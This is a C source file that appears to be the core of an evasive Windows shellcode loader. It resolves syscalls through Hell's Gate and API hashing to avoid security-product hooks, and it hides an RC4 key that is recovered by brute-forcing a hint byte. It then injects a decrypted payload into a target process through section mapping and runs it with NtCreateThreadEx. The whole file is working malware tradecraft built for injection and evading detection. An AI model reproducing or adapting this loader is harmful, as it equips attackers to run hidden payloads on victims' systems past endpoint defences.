/*
	file that contains most of the loader's functionality:
		- InitializeSyscalls: used to fetch the addresses of the syscalls / WinAPIs used
		- GetRemoteProcessHandle: used to get the target process handle
		- Rc4EncryptionViSystemFunc032: used to decrypt the payload by brute forcing the key
		- RemoteMappingInjectionViaSyscalls: used to inject the payload after decrypting it to the target process
*/

#include <Windows.h>


#include "Structs.h"
#include "Common.h"
#include "Debug.h"


VX_TABLE		g_Sys = { 0 };
API_HASHING		g_Api = { 0 };

/*
// original key
unsigned char Rc4Key[KEY_SIZE] = {
		0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };
*/

unsigned char EncRc4Key[KEY_SIZE] = {
		0x4D, 0x37, 0x8E, 0x81, 0x87, 0xBB, 0x89, 0xED, 0xBB, 0xFB, 0x7A, 0xCF, 0x31, 0x2B, 0xD7, 0xE4 };

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

	// initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;


	//	User32.dll exported
	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

	ULONG							uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;

	// this will fail (with status = STATUS_INFO_LENGTH_MISMATCH), but that's ok, because we need to know how much to allocate (uReturnLen1)
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG

		return FALSE;
	}

	while (TRUE) {

		// small check for the process's name size
		// comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
			// openning a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//



// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS        STATUS				= NULL;
	BYTE			RealKey	[KEY_SIZE]	= { 0 };
	int				b					= 0;

	// brute forcing the key:
	while (1) {
		// using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		// else, increment 'b' and try again
		else
			b++;
	}
#ifdef DEBUG
	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif // DEBUG

	// decrypting the key
	for (int i = 0; i < KEY_SIZE; i++) {
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
	}

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
					Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


	// using Cryptsp.dll instead of Advapi32.dll, since 'GetProcAddressH' doesnt not handle forwarded functions yet.
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Cryptsp"), SystemFunction032_JOAA);

	// if SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
						pRemoteAddress		= NULL,
						pExecAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

	DWORD				dwLocalFlag = PAGE_READWRITE;

	//--------------------------------------------------------------------------
		// allocating local map view 

	HellsGate(g_Sys.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	if (bLocal) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);
#endif // DEBUG

	//--------------------------------------------------------------------------

		// writing the payload
	_memcpy(pLocalAddress, pPayload, sPayloadSize);
#ifdef DEBUG
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);
#endif // DEBUG

	//--------------------------------------------------------------------------

		// allocating remote map view 
	if (!bLocal) {
		HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
		if ((STATUS = HellDescent(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
			return FALSE;
		}

#ifdef DEBUG
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);
#endif // DEBUG
	}
	//--------------------------------------------------------------------------

	pExecAddress = pRemoteAddress;
	if (bLocal) {
		pExecAddress = pLocalAddress;
	}



	if(!Rc4EncryptionViSystemFunc032(EncRc4Key, pLocalAddress, KEY_SIZE, sPayloadSize)) {
		return FALSE;
	}

	// executing the payload via thread creation

#ifdef DEBUG
	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
#endif // DEBUG
	HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
#endif // DEBUG

	//--------------------------------------------------------------------------


	// waiting for the thread to finish
	HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}
	
	// unmpaing the local view
	HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	// closing the section handle
	HellsGate(g_Sys.NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//

